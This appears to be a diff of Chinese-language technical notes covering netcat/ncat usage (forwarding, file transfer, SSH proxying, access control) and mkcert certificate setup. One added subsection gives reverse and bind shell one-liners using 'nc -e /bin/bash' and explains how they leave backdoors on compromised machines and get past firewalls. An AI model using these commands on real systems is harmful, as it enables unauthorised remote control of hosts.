@@ -4117,6 +4117,58 @@ ncat --ssl -lvp 1589
 <pre><code class="language-zsh"># 如果监听端使用了 --ssl 那么客户端也需要。
  ncat --ssl -nv &lt;IP Address&gt; 1589
 </code></pre>
+<p>成功建立通信后可以直接在命令行输入字符来进行通信，会像聊天一样。</p>
+<h3 id="流量转发"><a class="header" href="#流量转发">流量转发</a></h3>
+<p>流量转发可以用很多姿势，这里我用一个比较容易理解的姿势：</p>
+<pre><code class="language-zsh"># 目标机器
+nc -lvvp 1665
+# 中间负责转发的机器。-c 表示连接后直接用 sh 执行 -c 的内容。
+# 这里是表示连接到达中间服务器后，中间服务器再连接目标服务器，从而实现流量转发
+nc -lvvp 1589 -c 'nc -nv &lt;目标机器 IP&gt; &lt;端口&gt;'
+# 客户端
+nc -nv &lt;中间机器 IP&gt; &lt;中间机器端口&gt;
+</code></pre>
+<p>这样操作后，当客户端执行时，流量走向为：</p>
+<pre><code>客户端 -&gt; 中间机器 IP:PORT -&gt; 目标机器 IP:PORT
+</code></pre>
+<h3 id="发送文件"><a class="header" href="#发送文件">发送文件</a></h3>
+<p>既然都能通信了，那么发文件也是理所应当的，基本传文件本质也是流量传输。</p>
+<pre><code class="language-zsh"># 提供文件的机器，这样表示建立连接后把 temp.txt 的内容发送过去
+nc -lvvp 1665 &lt; temp.txt
+# 需要获取文件的机器，这样与目标建立连接后，把它发过来的内容重定向到一个文件中
+nc -nv &lt;IP&gt; &lt;PORT&gt; &gt; out.txt
+</code></pre>
+<p>方向换一下也是同理：</p>
+<pre><code class="language-zsh"># 接收文件的机器
+nc -lvvp 1665 &gt; out.txt
+# 发送文件的机器
+nc -nv &lt;IP&gt; &lt;PORT&gt; &lt; temp.txt
+</code></pre>
+<h3 id="反弹-shell"><a class="header" href="#反弹-shell">反弹 Shell</a></h3>
+<p>这个一般用于渗透时留后门，主要是利用 <code>nc</code> 的 <code>-c</code> 和 <code>-e</code> 。</p>
+<pre><code class="language-zsh"># 让客户端发送自己的 shell 给 &lt;IP&gt; &lt;PORT&gt;
+# 客户端，这样 &lt;IP&gt; &lt;PORT&gt; 被监听时就会拿到客户端的 shell
+# 后续 &lt;IP&gt; &lt;PORT&gt; 要再转发还是什么都可以自由操作
+nc -nv &lt;IP&gt; &lt;PORT&gt; -e /bin/bash
+-or
+nc -nv &lt;IP&gt; &lt;PORT&gt; -c bash
+</code></pre>
+<pre><code class="language-zsh"># 客户端开启一个端口，在这个端口上直接暴露自己的 shell
+nc -lp 6666 -e /bin/bash
+</code></pre>
+<p>如果用于渗透，肉鸡一般是内网环境，所以都是用的第一种，主动发送 shell 给攻击者。第二种需要攻击者能访问到肉鸡的 ip:port 才行。加上一般都有防火墙阻拦，肉鸡的入站流量可能会被防火墙拦截，但是防火墙一般不会对出站流量有限制，这也是第一种方式的用的比较多的原因。</p>
+<p>如果攻击者没有能让肉鸡访问到的 IP，一般通过内网穿透即可解决。</p>
+<h3 id="ssh-代理"><a class="header" href="#ssh-代理">SSH 代理</a></h3>
+<p>~/.ssh/config</p>
+<pre><code class="language-zsh">Host github.com
+  ProxyCommand ncat --proxy 127.0.0.1:10808 --proxy-type socks5  %h %p
+</code></pre>
+<p>这样对 github 仓库进行 <code>git pull</code> <code>git push</code> 这样的操作都会走代理。</p>
+<p><code>--proxy</code> 和 <code>--proxy-type</code> 可以让 <code>ncat</code> 摇身一变为一个代理工具。</p>
+<h3 id="--allow----allowfile"><a class="header" href="#--allow----allowfile"><code>--allow</code> / <code>--allowfile</code></a></h3>
+<p>限制可以连接到 <code>ncat</code>（<code>nc</code>） 的 hosts，可以指定一些 IP，来做到只允许指定目标连接。</p>
+<h3 id="--deny----denyfile"><a class="header" href="#--deny----denyfile"><code>--deny</code> / <code>--denyfile</code></a></h3>
+<p>与上面的相反，它是拒绝。</p>
 <div style="break-before: page; page-break-before: always;"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css" integrity="sha384-AfEj0r4/OFrOo5t7NnNe46zW/tFgW6x/bCJG8FqQCEo3+Aro6EYUG4+cU+KJWu/X" crossorigin="anonymous">
 <h2 id="mkcert"><a class="header" href="#mkcert">mkcert</a></h2>
 <p><code>mkcert</code> 是 GO 编写的，一个简单的<strong>零配置</strong>的，用来生成自签证书的工具。</p>
@@ -4151,7 +4203,6 @@ Ncat: Listening on 0.0.0.0:1589
 Ncat: Connection from 127.0.0.1.
 Ncat: Connection from 127.0.0.1:39156.
 Ncat: Failed SSL connection from 127.0.0.1: error:00000000:lib(0):func(0):reason(0)
-
 </code></pre>
 <p><code>mkcert</code>  自动生成并安装一个本地 CA 到 root stores，并且生成 locally-trusted 证书。<code>mkcert</code> 不会自动使用证书来配置服务器，不过，这取决于你。</p>
 <h2 id="安装-1"><a class="header" href="#安装-1">安装</a></h2>
@@ -4234,22 +4285,22 @@ scoop install mkcert
 <h2 id="高级-topics"><a class="header" href="#高级-topics">高级 topics</a></h2>
 <hr />
 <h3 id="高级选项"><a class="header" href="#高级选项">高级选项</a></h3>
-<pre><code class="language-zsh">	-cert-file FILE, -key-file FILE, -p12-file FILE
-	    自定义输出路径.
+<pre><code class="language-zsh">    -cert-file FILE, -key-file FILE, -p12-file FILE
+        自定义输出路径.
 
-	-client
-	    生成供客户端认证使用的证书.
+    -client
+        生成供客户端认证使用的证书.
 
-	-ecdsa
-	    生成使用一个 ECDSA （一种椭圆曲线签名算法）key 来生成证书.
+    -ecdsa
+        生成使用一个 ECDSA （一种椭圆曲线签名算法）key 来生成证书.
 
-	-pkcs12
-	    生成一个 &quot;.p12&quot; PKCS #12 文件，也可以被识别为 &quot;.pfx&quot; 文件,
-	    包含 cert 和 key for legacy applications.
+    -pkcs12
+        生成一个 &quot;.p12&quot; PKCS #12 文件，也可以被识别为 &quot;.pfx&quot; 文件,
+        包含 cert 和 key for legacy applications.
 
-	-csr CSR
-	    生成一个给予 CSR（证书签名申请） 的证书。
-	与除了 -install 和 -cert-file 以外的其它所以 flag 和参数冲突！
+    -csr CSR
+        生成一个给予 CSR（证书签名申请） 的证书。
+    与除了 -install 和 -cert-file 以外的其它所以 flag 和参数冲突！
 </code></pre>
 <p><a href="https://cloud.tencent.com/document/product/400/5367">SSL 证书 什么是CSR？-常见问题-文档中心-腾讯云</a></p>
 <blockquote>
@@ -4286,7 +4337,7 @@ scoop install mkcert
 <p>设置 <code>$CAROOT</code> 为 <code>rootCA.pem</code> 所在目录。</p>
 </li>
 <li>
-<p>运行 <code>mkcert -install</code></p>
+<p>运行 <code>mkcert -install</code>(arch linux 可以 <code>sudo trust anchor --store rootCA.pem</code>，其它发行版可以用自带的命令手动添加来信任 CA)</p>
 </li>
 </ul>
 <p>请千万记住 <code>mkcert</code> 是用于开发目的的，不建议用于生产，所以它不应该被用到用户终端上，并且你不应该导出或者共享 <code>rootCA-key.pem</code> 。</p>
